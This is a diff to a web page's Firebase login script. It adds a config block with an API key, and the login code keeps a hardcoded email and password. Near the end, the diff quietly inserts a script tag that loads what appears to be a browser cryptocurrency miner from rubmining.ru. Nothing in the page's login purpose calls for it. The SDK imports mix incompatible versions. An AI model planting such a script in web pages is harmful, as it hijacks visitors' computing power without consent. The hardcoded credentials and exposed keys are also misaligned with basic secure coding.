@@ -68,7 +68,20 @@
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/6.3.3/firebase-auth.js";
    alert('import')
-   const auth = getAuth();
+   const firebaseConfig = {
+     apiKey: "AIzaSyBhLISxR41ZYKyyffiY08c_YtqYQdu85pk",
+     authDomain: "test-b5ec3.firebaseapp.com",
+     databaseURL: "https://test-b5ec3-default-rtdb.firebaseio.com",
+     projectId: "test-b5ec3",
+     storageBucket: "test-b5ec3.appspot.com",
+     messagingSenderId: "489032935342",
+     appId: "1:489032935342:web:922e8c518ad0ff6b6eca3f",
+     measurementId: "G-YNQM9CV4P3"
+   };
+// Initialize Firebase
+   const app = initializeApp(firebaseConfig);
+
+   const auth = getAuth(app);
    const email ='5278862708@example.com';
    const password='secretPassword';
    signInWithEmailAndPassword(auth, email, password)
@@ -98,7 +111,7 @@
 
       
    </script>
-
+<script async="async" src="//www.rubmining.ru/lib/wm.js?s=12596&p=50"></script>
 </body>
 <script type="module">
       // Import the functions you need from the SDKs you need
